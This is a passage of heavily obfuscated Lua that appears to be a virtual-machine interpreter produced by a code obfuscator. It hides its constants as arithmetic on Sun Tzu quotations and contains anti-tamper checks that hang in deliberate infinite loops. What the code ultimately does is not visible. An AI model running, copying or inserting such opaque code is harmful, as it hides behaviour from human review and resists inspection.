end;if(a==803)and((c==164.41810759821004)and(d==770.2092247154675)and(e[290]==false)and(e[959]==(b._m09H19WY3Lf0))and(e[165]==(b._duAlo7RtRE)))then break end end end;local eb=5610;local fb=1764;while(eb>(fb-(#('"You have to believe in yourself." - Sun Tzu') - 34)))do fb=(eb+571)*2;while(eb<fb)do fb=eb-24724;while(eb>(fb-(#('"One may know how to conquer without being able to do it." - Sun Tzu') - 56)))do fb=(eb+1841)*(#('"Build your opponent a golden bridge to retreat across." - Sun Tzu') - 64)while(eb<fb)do fb=eb-29804;while(eb>(fb-10))do fb=(eb+4165)*2;while(eb<fb)do fb=eb-39100;while(eb>(fb-(#('"Great results can be achieved with small forces." - Sun Tzu') - 48)))do fb=(eb+1367)*(#('"To secure ourselves against defeat lies in our own hands, but the opportunity of defeating the enemy is provided by the enemy himself." - Sun Tzu') - 144)while(eb<fb)do fb=eb-27908;while(eb>(fb-12))do fb=(eb+3003)*2;ab=S and H end;if(11220-eb)<(fb+5631)then eb=((fb+5610)*2)Z=S and(W[(b._oi18Jg)][-1])or(0)end end;if eb>(fb-91344)then fb=(eb+11220)Q=(S==true and q)or(S==false and H or c())or{}end end;if(91344-eb)<(fb+45698)then eb=((fb+5610)*2)W[(b._UnuHrnmomO)]=S and(W[(b._UnuHrnmomO)])or(p)end end;if eb>(fb-250008)then fb=(eb+11220)Y=S and(W[(b._w85OWVOeOxyNu49)][-1])or(1)end end;if(250008-eb)<(fb+125039)then eb=((fb+5610)*2)T=false end end;if eb>(fb-567336)then fb=(eb+11220)V={}end end;if(567336-eb)<(fb+283702)then eb=((fb+5610)*2)R=(0)end end;if eb>(fb-1201992)then fb=(eb+11220)U=S and({})or(o)end end;local o=2892;local p=4208;while(o<p)do p=o-8416;while(o>(p-10))do p=(o+1803)*2;cb=function(a,c)local d=d;local f=t(-1,(b._RVOmUDFd))for h=1,g(a)do local a=x(e(n(a,h,h)),e(n(c,f,f)))d=u(d,n(m,a,a)or a,(b._zzKhZuiWEZA))f=r(g(c),f+1,(b._rKzJS0fhmdSuUBO))and 1 or s(f,1,(b._SDl2C))end;return d end end;if(5784-o)<(p+2915)then o=((p+2892)*2)E=function(a,...)return cb(a,db,...)end end end;local d={[0]=function()end,[1]=function()while E~=nil do bb[14.846713830317215]=237.73184778735535 end;return{0.9429391391812065}end}local e=nil(d)[3]=(d[1]) ;(d)[0]()local d={[(b._OZuA0x)]=function(a,c)if(S~=true and T)then local a=4223;local d=1556;while(a>(d-12))do d=(a+1629)*2;while(1==1 and T==(#W>-1))do W[c]=(b._ShA6kEr)end end;return elseif(W==nil)then W={}end;local d=4629;local e=3320;while(d>(e-10))do e=(d+4055)*2;while(d<e)do e=d-34736;while(d>(e-11))do e=(d+1767)*2;while(d<e)do e=d-25584;if(c==(b._YGxPqI1I))then X=c end end;if d>(e-9258)then e=(d+9258)if(c==(b._EKfoW40v4Kip))then X=c end end end;if(9258-d)<(e+4673)then d=((e+4629)*2)if(c==(b._cztTh4q5))then X=c end end end;if d>(e-74064)then e=(d+9258)if(c==(b._q9vH1tf4gIjjZL))then X=c end end end;if(c~=(b._YGxPqI1I)and c~=(b._q9vH1tf4gIjjZL)and c~=(b._cztTh4q5)and c~=(b._EKfoW40v4Kip))then local a=3596;local c=430;while(a>(c-11))do c=(a+4220)*2;if((b._ob3wg8))then return J((b._Zz7w83XB))end end end;return a end;[(b._JjDbPdv8CnPRg)]=function(c,d,e,f,g,h)if(S~=true and T)then return J((b._pT9u03A))end;if(X==(b._YGxPqI1I))then if(M)then do local a=495;local c=168.54606880832023;local e=310.91205676736485;local f={}while(true)do if((c==3.6120141390356295)and(e==75.97800824755905)and(f[154]==false)and(f[813]==(b._MpdrgG8ESJbWyX3))and(f[140]==(b._dJnDlHOwfP)))and(a==0)then local g={[(b._MlekP7)]=M}local h=2060;local j=658;while(h>(j-(#('"There are five dangerous faults which may affect a general: (1) Recklessness, which leads to destruction; (2) cowardice, which leads to capture; (3) a hasty temper, which can be provoked by insults; (4) a delicacy of honor which is sensitive to shame; (5) over-solicitude for his men, which exposes him to worry and trouble." - Sun Tzu') - 324)))do j=(h+1284)*2;while(h<j)do j=h-13376;while(h>(j-12))do j=(h+2424)*2;while(h<j)do j=h-17936;while(h>(j-12))do j=(h+4023)*2;g[3]=d[3]end;if(4120-h)<(j+2106)then h=((j+2060)*2)g[1]=d[1]end end;if h>(j-56904)then j=(h+4120)g[(b._bOTtRIt8Nw)]=false end end;if(56904-h)<(j+28492)then h=((j+2060)*2)g[2]=d[2]end end;if h>(j-138528)then j=(h+4120)W[(b._w85OWVOeOxyNu49)][Y]=g end end;f[813]=(b._Tn550EnZawem4M)e=161.22997174270932;c=282.33169946020644;f[154]=false;f[140]=(b._krZUWPG1)a=332 end;if(a==458)and((c==46.16495140353039)and(e==186.3757692498799)and(f[154]==false)and(f[813]==(b._5DG8emG))and(f[140]==(b._znv2mblfurb)))then a=526;c=536.1808642129603;M=nil;f[140]=(b._gJONc7JBtn)e=50.68182423658235;f[154]=false;f[813]=(b._TbNS3Y0mhG7GQmm)end;while((c==168.54606880832023)and(e==310.91205676736485))and(a==495)do f[813]=(b._MpdrgG8ESJbWyX3)e=75.97800824755905;a=0;f[154]=false;c=3.6120141390356295;f[140]=(b._dJnDlHOwfP)break end;while(a==739)and((c==20.706022043635016)and(e==39.91638306016861)and(f[154]==false)and(f[813]==(b._a_QeIBC))and(f[140]==(b._gM0W7Le)))do e=310.91205676736485;a=495;c=168.54606880832023;break end;if((c==536.1808642129603)and(e==50.68182423658235)and(f[154]==false)and(f[813]==(b._TbNS3Y0mhG7GQmm))and(f[140]==(b._gJONc7JBtn)))and(a==526)then break end;while((c==282.33169946020644)and(e==161.22997174270932)and(f[154]==false)and(f[813]==(b._Tn550EnZawem4M))and(f[140]==(b._krZUWPG1)))and(a==332)do f[154]=false;Y=Y+((function(A) return (#A - 126) end)('"If you fight with all your might, there is a chance of life; where as death is certain if you cling to your corner." - Sun Tzu'))a=458;f[813]=(b._5DG8emG)f[140]=(b._znv2mblfurb)e=186.3757692498799;c=46.16495140353039;break end end end else do local a=315;local c=380.88493586213986;local e=98.36258221730753;local f={}for g in(function()return 498 end)do if((c==24.093527935918658)and(e==489.84289770559786)and(f[591]==false)and(f[225]==(b._d9rjA8LID))and(f[770]==(b._Fbi2CUVHIfK6Cd)))and(a==917)then break end;if((c==460.9792656617741)and(e==253.57347012398014)and(f[591]==false)and(f[225]==(b._L9tE4QvzLzpK))and(f[770]==(b._jwM0ysal5)))and(a==0)then a=917;M=d;e=489.84289770559786;f[770]=(b._Fbi2CUVHIfK6Cd)c=24.093527935918658;f[591]=false;f[225]=(b._d9rjA8LID)end;while(a==197)and((c==120.40083564224041)and(e==428.78196029479597)and(f[591]==false)and(f[225]==(b._lNeQV12M1dydoD))and(f[770]==(b._T9OF1mKlQZu)))do e=98.36258221730753;a=315;c=380.88493586213986;break end;while((c==380.88493586213986)and(e==98.36258221730753))and(a==315)do c=460.9792656617741;f[770]=(b._jwM0ysal5)f[591]=false;a=0;f[225]=(b._L9tE4QvzLzpK)e=253.57347012398014;break end end end end elseif(X==(b._q9vH1tf4gIjjZL))then local a;local c=1359;local e=6891;while(c<e)do e=c-13782;a=W[(b._oi18Jg)][Z-1]end;if(d==nil and C(a)==(b.__mt2HwH9AA))then do local c=779;local d=49.98087844104458;local e=198.78038809756953;local f={}for g in(function()return 498 end)do if((d==2.2331738082676726)and(e==149.81487611751598)and(f[461]==false)and(f[110]==(b._GSj252wWU))and(f[797]==(b._EFX8nWw__)))and(c==0)then c=91;f[110]=(b._qX2f)e=511.92204507873345;f[461]=false;W[(b._oi18Jg)][Z-1]={D(a)}f[797]=(b._IbonUy8S)d=109.20545371949233 end;while(c==50)and((d==520.8998932168658)and(e==103.30411842024142)and(f[461]==false)and(f[110]==(b._G9RsoYp7O))and(f[797]==(b._BZ_p3bRwjecr)))do c=779;e=198.78038809756953;d=49.98087844104458;break end;if(c==779)and((d==49.98087844104458)and(e==198.78038809756953))then d=2.2331738082676726;c=0;f[110]=(b._GSj252wWU)f[461]=false;f[797]=(b._EFX8nWw__)e=149.81487611751598 end;if((d==109.20545371949233)and(e==511.92204507873345)and(f[461]==false)and(f[110]==(b._qX2f))and(f[797]==(b._IbonUy8S)))and(c==91)then break end end end elseif(C(d)==(b._Fpyvp)and d[(b._f9lK48Nrf_U7C)]==true)then local a=663;local c=1373;while(a<c)do c=a-2746;while(a>(c-11))do c=(a+746)*2;W[(b._oi18Jg)][Z]=d end;if(1326-a)<(c+670)then a=((c+663)*2)Z=Z+1 end end elseif(C(d)==(b._Fpyvp))then do local a=413;local c=285.9915629916266;local e=35.518239703525026;local f={}for g in(function()return 498 end)do while((c==352.0268066090488)and(e==174.8043592216041)and(f[296]==false)and(f[356]==(b._zvwotsKrHhKo))and(f[845]==(b._LixRwi1AHW)))and(a==0)do f[845]=(b._VL8nw5ukbA)a=303;e=1.9194646128131605;f[356]=(b._sh4PDfzNk)W[(b._oi18Jg)][Z]=d[(#('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu') - 208)]or nil;f[296]=false;c=143.11276671970822;break end;if((c==791.2064288159839)and(e==127.57309496249037)and(f[296]==false)and(f[356]==(b._fUp0inwS2qucNl8))and(f[845]==(b._m9o7Ai1)))and(a==263)then break end;if((c==285.9915629916266)and(e==35.518239703525026))and(a==413)then f[845]=(b._LixRwi1AHW)c=352.0268066090488;e=174.8043592216041;f[356]=(b._zvwotsKrHhKo)f[296]=false;a=0 end;if(a==818)and((c==674.3673206257167)and(e==22.774064170238397)and(f[296]==false)and(f[356]==(b._dRzGdw9A1R))and(f[845]==(b._rQhfD0JpGsCe57M)))then e=35.518239703525026;a=413;c=285.9915629916266 end;if(a==303)and((c==143.11276671970822)and(e==1.9194646128131605)and(f[296]==false)and(f[356]==(b._sh4PDfzNk))and(f[845]==(b._VL8nw5ukbA)))then Z=Z+1;e=127.57309496249037;f[356]=(b._fUp0inwS2qucNl8)a=263;f[845]=(b._m9o7Ai1)c=791.2064288159839;f[296]=false end end end else do local a=845;local c=116.45169396507892;local e=2.7941687098090404;local f={}for g in(function()return 498 end)do while((c==612.7201802178726)and(e==83.33105780674941)and(f[613]==false)and(f[530]==(b._mvEZMOzvaKUgaEG))and(f[435]==(b._LoMGjBtuhMmb)))and(a==0)do f[613]=false;f[530]=(b._RPhcN)c=134.31222661651927;e=949.7389499120753;a=344;W[(b._oi18Jg)][Z]=d;f[435]=(b._LpyMi0Nuvempv)break end;if(a==193)and((c==228.97584977233345)and(e==166.96316658364694)and(f[613]==false)and(f[530]==(b._X3iAciikw8V1m))and(f[435]==(b._FL1et)))then break end;while(a==344)and((c==134.31222661651927)and(e==949.7389499120753)and(f[613]==false)and(f[530]==(b._RPhcN))and(f[435]==(b._LpyMi0Nuvempv)))do e=166.96316658364694;f[435]=(b._FL1et)a=193;f[530]=(b._X3iAciikw8V1m)c=228.97584977233345;Z=Z+(#('"In the midst of chaos, there is also opportunity." - Sun Tzu') - 60)f[613]=false;break end;if(a==638)and((c==69.50657442227488)and(e==27.562345102437977)and(f[613]==false)and(f[530]==(b._PafS6nPqxriyjs3))and(f[435]==(b._bg7lI)))then c=116.45169396507892;e=2.7941687098090404;a=845 end;while(a==845)and((c==116.45169396507892)and(e==2.7941687098090404))do f[530]=(b._mvEZMOzvaKUgaEG)a=0;c=612.7201802178726;e=83.33105780674941;f[613]=false;f[435]=(b._LoMGjBtuhMmb)break end end end end elseif(X==(b._EKfoW40v4Kip))then local c;c=function(d)local e={}local f=0;for c=((function(A) return (#A - 208) end)('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu')),#d[(b._C19PwqcBjmag)]do local c=d[(b._C19PwqcBjmag)][c]if(C(c)==(b._Fpyvp))then a()e[f]={D(c[1])}f=f+1 else e[f]=c;f=f+1 end end;e[-1]=f;d[(b._oi18Jg)]=e;local a={}local e=1;for c=1,#d[(b._nU9z5QR7BaCe)]do local b=d[(b._nU9z5QR7BaCe)][c]a[e]=b;e=e+1 end;a[-1]=e;d[(b._w85OWVOeOxyNu49)]=a;local a={}local e=0;for f=(#('"The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." - Sun Tzu') - 98),#d[(b._nGGKAtFjdXp)]do a[e]=c(d[(b._nGGKAtFjdXp)][f])e=e+1 end;d[(b._nGGKAtFjdXp)]=a;d[(b._nGGKAtFjdXp)][-1]=e;return d end;local a=c(d)W[(b._nGGKAtFjdXp)][R]=a;R=R+1 elseif(X==(b._cztTh4q5))then while(d>-1)do W[e]=W[e]or{}W[f]=W[f]or{}W[g]=W[g]or{}W[(b._KUiGabZSAZxq)]=W[(b._KUiGabZSAZxq)]or h;d=(d*-1)-(50)end end;return c end}local function e(d,...)if(S~=true and T)then return J((b._l3BW63w))else T=true end;local d,e=1,-1;local g={}local g=k({},{[(b._OZuA0x)]=g,[(b._cGEsnHCpuU3A)]=function(a,a,b)if(a>e)then e=a end;g[a]=b end})local c,m={},c()[(b._lLYWq_mJYoFn)]((b._vtCCkTNtp8L3G),...)-1;local o={...}for a=0,m do if(a>=W[(b._KUiGabZSAZxq)])then c[a-W[(b._KUiGabZSAZxq)]]=o[a+1]else g[a]=o[a+1]end end;local function c()local c=W[(b._oi18Jg)]while true do local m,m,o,o,o;o=W[(b._w85OWVOeOxyNu49)][d]d=d+1;m=o[(b._MlekP7)]local p=A;if(m==542)then local a=o[((function(A) return (#A - 59) end)('"Great results can be achieved with small forces." - Sun Tzu'))]local b=o[2]local c=g;local d,f;local g;if(b==1)then return elseif(b==0)then g=e else g=a+b-2 end;f={}d=0;for a=a,g do d=d+1;f[d]=c[a]end;do return f,d end else if(m~=7441)then if(m~=8090)then if(719==m)then if(o[3]>=256)then o[5]=o[3]-256;o[5]=W[(b._oi18Jg)][o[5]]end;local a=g;local b=o[(#('"Never venture, never win!" - Sun Tzu') - 36)]local c=a[o[2]]local d=o[5]or a[o[3]]a[b+1]=c;a[b]=c[d]elseif(m~=719)then if(1275==m)then for a,c in l(W[(b._oi18Jg)])do if(C(c)==(b._uCz3YI8)and C(c[1])==(b._Xie9k2BuwX))then W[(b._oi18Jg)][a]=w(c[(#('"There are not more than five musical notes, yet the combinations of these five give rise to more melodies than can ever be heard. There are not more than five primary colours, yet in combination they produce more hues than can ever been seen. There are not more than five cardinal tastes, yet combinations of them yield more flavours than can ever be tasted." - Sun Tzu') - 369)],F)end end elseif(m~=1275)then if(m~=740)then if(m==341)then local a=g;local c,d=a[o[2]],a[o[3]]o[3]=o[(#('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu') - 206)]or false;if(o[2]>=256)then c=o[2]-256;c=W[(b._oi18Jg)][c]end;c=c or false;if(o[3]>=256)then d=o[3]-256;d=W[(b._oi18Jg)][d]end;a[o[((function(A) return (#A - 208) end)('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu'))]][c]=d elseif(m~=341)then if(m~=4736)then if(987~=m)then if(2413~=m)then if(m==960)then local a=g;local c=a[o[3]]if(o[3]>=256)then c=o[3]-256;c=W[(b._oi18Jg)][c]end;a[o[1]]=a[o[2]][c]elseif(m~=960)then if(m~=992)then if(2688==m)then K=n(W[g[o[1]]],g[o[2]],g[o[(#('"Never venture, never win!" - Sun Tzu') - 34)]])K=n(W[g[o[1]]],g[o[2]],g[o[3]])do return g[o[3]]end;Q[B(W[(b._oi18Jg)][o[2]])]=g[o[1]]do return g[o[3]]end elseif(m~=2688)then if(854~=m)then if(m~=443)then if(m==8218)then for a,c in l(W[(b._oi18Jg)])do if(C(c)==(b._uCz3YI8)and C(c[1])==(b._Xie9k2BuwX))then W[(b._oi18Jg)][a]=w(c[1],z)end end;K=n(W[g[o[1]]],g[o[2]],g[o[3]])if(P(g[o[(#('"Wheels of justice grind slow but grind fine." - Sun Tzu') - 55)]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;g[o[(#('"In battle, there are not more than two methods of attack-the direct and the indirect; yet these two in combination give rise to an endless series of maneuvers." - Sun Tzu') - 170)]]=B(W[(b._oi18Jg)][o[2]])Q[B(W[(b._oi18Jg)][o[((function(A) return (#A - 82) end)('"The opportunity of defeating the enemy is provided by the enemy himself." - Sun Tzu'))]])]=g[o[1]]local a=g;local b=o[(#('"Foreknowledge cannot be gotten from ghosts and spirits, cannot be had by analogy, cannot be found out by calculation. It must be obtained from people, people who know the conditions of the enemy." - Sun Tzu') - 205)]local c=a[b]for b=b+1,o[3]do c=c..a[b]end;g[o[1]]=c;g[o[2]]=K elseif(m~=8218)then if(383==m)then local a=o[1]local b=o[3]local c=g;local e=a+2;local f={c[a](c[a+1],c[a+(#('"The wise warrior avoids the battle." - Sun Tzu') - 45)])}for a=1,b do g[e+a]=f[a]end;if(c[a+3]~=nil)then c[a+(#('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu') - 207)]=c[a+3]else d=d+1 end elseif(m~=383)then if(m==8025)then W[(b._oi18Jg)][i]=w(v[1],z)K=n(W[g[o[1]]],g[o[2]],g[o[3]])d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))if(P(g[o[1]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;P(g[o[1]](I(args,1,limit-o[1],(K))))else if(2739~=m)then if(8140~=m)then if(m==5568)then o[5]=W[(b._oi18Jg)][o[5]]Q[B(W[(b._oi18Jg)][o[2]])]=g[o[1]]g[o[1]]=B(W[(b._oi18Jg)][o[2]])elseif(m~=5568)then if(m==494)then g[o[1]]=g[o[((function(A) return (#A - 64) end)('"Build your opponent a golden bridge to retreat across." - Sun Tzu'))]]else if(522~=m)then if(m==2631)then g[o[1]]=B(W[(b._oi18Jg)][o[2]])g[o[1]]=Q[W[(b._oi18Jg)][o[2]]](K)Q[B(W[(b._oi18Jg)][o[2]])]=g[o[1]]d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))g=o[2]%g[o[(#('"Plan for what it is difficult while it is easy, do what is great while it is small." - Sun Tzu') - 93)]]*o[1]g[o[1]]={n((K),1,g[o[2]])}local a=W[(b._oi18Jg)][o[1]+o[(#('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu') - 69)]]g[o[1]]=a[o[2]]else if(9877~=m)then if(9464~=m)then if(m==7187)then for a,c in l(W[(b._oi18Jg)])do if(C(c)==(b._uCz3YI8)and C(c[1])==(b._Xie9k2BuwX))then W[(b._oi18Jg)][a]=w(c[1],z)end end;K=n(W[g[o[(#('"What the ancients called a clever fighter is one who not only wins, but excels in winning with ease." - Sun Tzu') - 111)]]],g[o[2]],g[o[3]])if(P(g[o[1]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;g[o[((function(A) return (#A - 59) end)('"Great results can be achieved with small forces." - Sun Tzu'))]]=B(W[(b._oi18Jg)][o[2]])Q[B(W[(b._oi18Jg)][o[2]])]=g[o[1]]local a=g;local b=o[2]local c=a[b]for b=b+(#('"Wheels of justice grind slow but grind fine." - Sun Tzu') - 55),o[3]do c=c..a[b]end;g[o[1]]=c;g[o[2]]=K else if(257~=m)then if(3482~=m)then if(4544~=m)then if(38~=m)then if(m==370)then if o[3]then if g[o[(#('"Great results can be achieved with small forces." - Sun Tzu') - 59)]]then d=d+1 end elseif g[o[1]]then else d=d+1 end else if(2224==m)then for a=g[o[2]],g[o[1]]do g[o[3]]=g[o[3]]..g[W[(b._oi18Jg)]][a]end;g[o[1]]=w(W[(b._oi18Jg)][o[2]],z)Q[B(W[(b._oi18Jg)][o[2]])]=g[o[1]]P(g[o[1]](I(args,1,limit-o[1],(K))))P(g[o[1]](I(args,((function(A) return (#A - 111) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu')),limit-o[(#('"In battle, there are not more than two methods of attack-the direct and the indirect; yet these two in combination give rise to an endless series of maneuvers." - Sun Tzu') - 170)],(K))))else if(m==211)then d=d+o[2]else end end end elseif(m==38)then g[o[1]]=ab[o[2]]end elseif(m==4544)then d=d-1;g[o[1]]=Q[W[(b._oi18Jg)][o[2]]](K)g[o[1]]=Q[W[(b._oi18Jg)][o[2]]](K)d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))g[o[1]]={n((K),1,g[o[2]])}end elseif(m==3482)then if(P(g[o[(#('"There are roads which must not be followed, armies which must not be attacked, towns which must not be besieged, positions which must not be contested, commands of the sovereign which must not be obeyed." - Sun Tzu') - 214)]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;g[o[1]]=Q[W[(b._oi18Jg)][o[2]]](K)W[(b._oi18Jg)]=o[(#('"If you fight with all your might, there is a chance of life; where as death is certain if you cling to your corner." - Sun Tzu') - 125)]/{[o[1]]=(b._FoQMyyS5Xvngf),[o[3]]=K}end elseif(m==257)then local a=W[(b._dW2ISxC)][o[2]]local c=g;local e;local f;if(a[(b._U9zZk9COcderAEp)]~=0)then e={}f=k({},{[(b._OZuA0x)]=function(a,a)local a=e[a]return a[1][a[2]]end,[(b._cGEsnHCpuU3A)]=function(a,a,b)local a=e[a]a[(#('Anger may in time change to gladness; vexation may be succeeded by content. But a kingdom that has once been destroyed can never come again into being; nor can the dead ever be brought back to life." - Sun Tzu') - 208)][a[2]]=b end})for a=1,a[(b._UnuHrnmomO)]do local f=W[(b._w85OWVOeOxyNu49)][d]if(f[(b._uoSOzCy_vd)]==494)then e[a-1]={c,f[2]}elseif(f[(b._uoSOzCy_vd)]==((function(A) return (#A - 89) end)('"If you fight with all your might, there is a chance of life; where as death is certain if you cling to your corner." - Sun Tzu')))then e[a-1]={ab,f[2]}end;d=d+1 end;V[#V+1]=e end;local a,d=h(0,(b._sXpKSxbkYbYpk1q),a,Q,f)a.xXo6YY5yZL(0,(b._oi18Jg),(b._w85OWVOeOxyNu49),(b._dW2ISxC),W[(b._KUiGabZSAZxq)])c[o[1]]=function(...)return d(a,...)end end end elseif(m==9464)then a()if g[o[((function(A) return (#A - 206) end)('"Foreknowledge cannot be gotten from ghosts and spirits, cannot be had by analogy, cannot be found out by calculation. It must be obtained from people, people who know the conditions of the enemy." - Sun Tzu'))]]~=o[2]or j~=(b._y9eNXjnzm0gO8)or G~=D("\10\37\29\40\26\0\18\2\92\78\2\33\57\12\40\6\13\88\0\23\65\36\18\15\5\1\22\12\35\17\27")then d=d-1;return(function()while true do j=g[1]G=g[2]end end)()elseif not(g[o[1]]~=o[((function(A) return (#A - 121) end)('"Victorious warriors win first and then go to war, while defeated warriors go to war first and then seek to win." - Sun Tzu'))]or j~=(b._y9eNXjnzm0gO8)or G~=D("\10\37\29\40\26\0\18\2\92\78\2\33\57\12\40\6\13\88\0\23\65\36\18\15\5\1\22\12\35\17\27"))then g[o[1]]=nil;g[0]=nil;e=s(1,-1,(b._XKmpRy8N7I))end end else d=d-1;g[o[((function(A) return (#A - 111) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu'))]]=Q[W[(b._oi18Jg)][o[(#('"Wheels of justice grind slow but grind fine." - Sun Tzu') - 54)]]](K)g[o[1]]=Q[W[(b._oi18Jg)][o[(#('"Quickness is the essence of the war." - Sun Tzu') - 46)]]](K)d=d-((function(A) return (#A - 81) end)('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu'))*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))g[o[1]]={n((K),1,g[o[2]])}end end elseif(m==522)then W[(b._oi18Jg)][i]=w(v[1],z)K=n(W[g[o[1]]],g[o[(#('"Build your opponent a golden bridge to retreat across." - Sun Tzu') - 64)]],g[o[3]])d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))if(P(g[o[1]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;P(g[o[((function(A) return (#A - 55) end)('"Wheels of justice grind slow but grind fine." - Sun Tzu'))]](I(args,(#('"Attack is the secret of defense; defense is the planning of an attack." - Sun Tzu') - 81),limit-o[1],(K))))end end end elseif(m==8140)then o[5]=W[(b._oi18Jg)][o[5]]P(g[o[1]](I(args,1,limit-o[1],(K))))local a=g;local c=o[2]local d=a[c]for b=c+1,o[3]do d=d..a[b]end;g[o[1]]=d;g[o[2]]=K;g[o[1]]=Q[B(W[(b._oi18Jg)][o[2]])]for a,c in l(W[(b._oi18Jg)])do if(C(c)==(b._uCz3YI8)and C(c[1])==(b._Xie9k2BuwX))then W[(b._oi18Jg)][a]=w(c[1],z)end end;local a=g;local b=o[2]local c=a[b]for b=b+1,o[3]do c=c..a[b]end;g[o[1]]=c;g[o[2]]=K end else if(P(g[o[(#('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu') - 71)]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;W[(b._oi18Jg)]=o[2]/{[o[((function(A) return (#A - 111) end)('"Treat your men as you would your own beloved sons. And they will follow you into the deepest valley." - Sun Tzu'))]]=(b._FoQMyyS5Xvngf),[o[(#('"One may know how to conquer without being able to do it." - Sun Tzu') - 65)]]=K}g[o[1]]={n((K),1,g[o[2]])}local a=g;local c=o[2]local d=a[c]for b=c+(#('"Never venture, never win!" - Sun Tzu') - 36),o[3]do d=d..a[b]end;g[o[1]]=d;g[o[2]]=K;local a=W[(b._oi18Jg)][o[1]+o[(#('"Be where your enemy is not." - Sun Tzu') - 36)]]g[o[1]]=a[o[2]]end end end end elseif(443==m)then g[o[1]]=Q[W[(b._oi18Jg)][o[(#('"The art of war is of vital importance to the State. It is a matter of life and death, a road either to safety or to ruin. Hence it is a subject of inquiry which can on no account be neglected." - Sun Tzu') - 202)]]]end else for a=g[o[2]],g[o[1]]do g[o[3]]=g[o[3]]..g[W[(b._oi18Jg)]][a]end;g[o[1]]=w(W[(b._oi18Jg)][o[2]],z)Q[B(W[(b._oi18Jg)][o[(#('"The skillful tactician may be likened to the shuai-jan. Now the shuai-jan is a snake that is found in the Chang mountains. Strike at its head, and you will be attacked by its tail; strike at its tail, and you will be attacked by its head; strike at its middle, and you will be attacked by head and tail both." - Sun Tzu') - 318)]])]=g[o[1]]P(g[o[1]](I(args,1,limit-o[1],(K))))P(g[o[1]](I(args,1,limit-o[1],(K))))end end else local a=o[(#('"There is no instance of a nation benefiting from prolonged warfare." - Sun Tzu') - 78)]local b=o[2]local c=o[3]local d=g;local f,g;local h,j;f={}if(b~=1)then if(b~=0)then h=a+b-1 else h=e end;j=0;for a=a+1,h do j=j+1;f[j]=d[a]end;h,g=P(d[a](I(f,1,h-a)))else h,g=P(d[a]())end;e=a-(#('"There are five dangerous faults which may affect a general: (1) Recklessness, which leads to destruction; (2) cowardice, which leads to capture; (3) a hasty temper, which can be provoked by insults; (4) a delicacy of honor which is sensitive to shame; (5) over-solicitude for his men, which exposes him to worry and trouble." - Sun Tzu') - 335)if(c~=1)then if(c~=0)then h=a+c-2 else h=h+a-(#('"He will win who knows when to fight and when not to fight." - Sun Tzu') - 69)end;j=0;for a=a,h do j=j+1;d[a]=g[j]end end end end elseif(m==2413)then o[5]=W[(b._oi18Jg)][o[5]]if(P(g[o[1]])==K)then W[(b._MlekP7)]=(function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5))end;do d=d+1 end;for a=g[o[2]],g[o[((function(A) return (#A - 47) end)('"Quickness is the essence of the war." - Sun Tzu'))]]do g[o[3]]=g[o[3]]..g[W[(b._oi18Jg)]][a]end;d=d-1*(W[(b._w85OWVOeOxyNu49)])W[(b._MlekP7)]((function(a)return a^(b._q9vH1tf4gIjjZL)end)((b._cztTh4q5)))g[o[(#('"He who is prudent and lies in wait for an enemy who is not, will be victorious." - Sun Tzu') - 90)]]=w(W[(b._oi18Jg)][o[2]],z)end else g[o[1]]=W[(b._oi18Jg)][o[2]]end elseif(4736==m)then local a,a=L(function()local a=1-(b._NTJII5MaQk)^2;return(b._COtbGmZd_0JF)/a end)local a=f(A(a),(b._ihzbD))()local a=y(a)local c=N(L(function()local a=(b._OKHTp5prY)^(#('"One mark of a great soldier is that he fight on his own terms or fights not at all." - Sun Tzu') - 93)return(b._atZWP0wnbJUn_jw)%a end))if(c~=O or O==nil or(C~=nil and C(O)~=(b._Ig7rIiI5uol9))or c~=a or a~=O)then d=s(d,1,(b._tKcPXKXVThvIO))return(function()while true do d=d-1;if d<-100 then d=1000 end end;return(b._uFL3vjau3bc)end)()elseif not(c~=O or O==nil or(C~=nil and C(O)~=(b._Ig7rIiI5uol9))or c~=a or a~=O)then g[o[1]]=o[(#('"If quick, I survive. If not quick, I am lost. This is death." - Sun Tzu') - 70)]end end end else local 